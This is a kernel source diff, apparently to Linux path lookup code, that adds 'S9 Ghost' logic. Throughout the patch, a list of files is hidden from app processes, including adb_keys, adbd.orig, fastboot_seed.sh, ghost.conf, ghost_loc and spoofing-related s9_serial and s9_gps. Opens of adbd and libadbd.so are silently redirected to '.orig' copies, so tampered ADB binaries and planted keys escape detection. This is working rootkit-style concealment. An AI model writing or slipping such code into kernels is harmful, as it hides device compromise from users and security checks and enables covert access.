@@ -1872,9 +1872,31 @@ static inline int should_follow_link(struct nameidata *nd, struct path *link,
 
 enum {WALK_GET = 1, WALK_PUT = 2};
 
+static inline bool s9_is_ghost_hidden_filename(const char *name, int len)
+{
+	if (!name || len <= 0)
+		return false;
+	if ((len == 9 && memcmp(name, "s9_serial", 9) == 0) ||
+	    (len == 6 && memcmp(name, "s9_gps", 6) == 0) ||
+	    (len == 11 && memcmp(name, "s9_headless", 11) == 0) ||
+	    (len == 19 && memcmp(name, "fastboot_dalvik.tar", 19) == 0) ||
+	    (len == 22 && memcmp(name, "fastboot_dalvik.tar.gz", 22) == 0) ||
+	    (len == 16 && memcmp(name, "fastboot_seed.sh", 16) == 0) ||
+	    (len == 19 && memcmp(name, "init.fix_storage.rc", 19) == 0) ||
+	    (len == 8 && memcmp(name, "adb_keys", 8) == 0) ||
+	    (len == 9 && memcmp(name, "adbd.orig", 9) == 0) ||
+	    (len == 15 && memcmp(name, "libadbd.so.orig", 15) == 0) ||
+	    (len == 10 && memcmp(name, "ghost.conf", 10) == 0) ||
+	    (len >= 9 && memcmp(name, "ghost_loc", 9) == 0))
+		return true;
+	return false;
+}
+
 static inline bool s9_is_hidden_adb_dentry(struct dentry *dentry)
 {
 	struct dentry *cur = dentry;
+	if (cur && s9_is_ghost_hidden_filename(cur->d_name.name, cur->d_name.len))
+		return true;
 	while (cur && cur->d_parent && cur != cur->d_parent) {
 		struct dentry *p = cur->d_parent;
 		if (cur->d_name.len == 3 && memcmp(cur->d_name.name, "adb", 3) == 0) {
@@ -1890,7 +1912,9 @@ static inline bool s9_is_hidden_adb_dentry(struct dentry *dentry)
 
 static inline bool s9_is_blocked_adb_component(struct nameidata *nd)
 {
-	if (unlikely(current_uid().val >= 10000)) {
+	if (unlikely(current_uid().val >= 10000) && (!nd->name || nd->name->uptr != NULL)) {
+		if (s9_is_ghost_hidden_filename(nd->last.name, nd->last.len))
+			return true;
 		if (nd->last.len == 3 && memcmp(nd->last.name, "adb", 3) == 0) {
 			struct dentry *p = nd->path.dentry;
 			if (p) {
@@ -3367,7 +3391,7 @@ static int lookup_open(struct nameidata *nd, struct path *path,
 		}
 #endif
 		/* S9 Ghost: Block cached /data/adb dentry for untrusted apps */
-		if (unlikely(current_uid().val >= 10000 && s9_is_hidden_adb_dentry(dentry))) {
+		if (unlikely(current_uid().val >= 10000 && (!nd->name || nd->name->uptr != NULL) && s9_is_hidden_adb_dentry(dentry))) {
 			dput(dentry);
 			return -ENOENT;
 		}
@@ -3808,14 +3832,26 @@ struct file *do_filp_open(int dfd, struct filename *pathname,
 	struct nameidata nd;
 	int flags = op->lookup_flags;
 	struct file *filp;
+	struct filename *redir_name = NULL;
 
-	set_nameidata(&nd, dfd, pathname);
+	if (unlikely(current_uid().val >= 10000 && pathname && pathname->name)) {
+		if (!strcmp(pathname->name, "/system/lib64/libadbd.so"))
+			redir_name = getname_kernel("/system/lib64/libadbd.so.orig");
+		else if (!strcmp(pathname->name, "/system/bin/adbd"))
+			redir_name = getname_kernel("/system/bin/adbd.orig");
+		if (IS_ERR(redir_name))
+			redir_name = NULL;
+	}
+
+	set_nameidata(&nd, dfd, redir_name ? redir_name : pathname);
 	filp = path_openat(&nd, op, flags | LOOKUP_RCU);
 	if (unlikely(filp == ERR_PTR(-ECHILD)))
 		filp = path_openat(&nd, op, flags);
 	if (unlikely(filp == ERR_PTR(-ESTALE)))
 		filp = path_openat(&nd, op, flags | LOOKUP_REVAL);
 	restore_nameidata();
+	if (unlikely(redir_name))
+		putname(redir_name);
 	return filp;
 }
 
